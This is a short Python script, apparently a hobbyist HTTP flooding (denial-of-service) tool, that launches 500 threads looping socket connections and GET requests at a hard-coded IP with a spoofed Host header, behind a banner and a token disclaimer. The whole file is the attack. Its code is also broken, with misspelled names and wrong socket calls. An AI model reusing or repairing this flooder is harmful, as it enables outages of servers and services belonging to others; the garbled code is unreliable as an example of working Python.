import threading
import socket

print \
"""
    ___   ___           __
    |  '  |  '    __   /
    | | | | | |  '  '  \_
    | | | | | | | || |   \
    |__'  |__'   '__'  __/
    ________________________
    made by Bananut|v1.0
    ____________________________________
    Pleas don't use this script illegaly.
"""

target = "http://192.168.0.181"
port = 80
fake_ip = "185.186.250.123"

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AD_INET,SOCK_STREAM)
        s.connect(target, port)
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"),(target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))
        s.close()
        
        global already_connected
        already_connectected += 1
        
for i in range(500):
    thread = threding.Thread(target=attack)
    thread.start()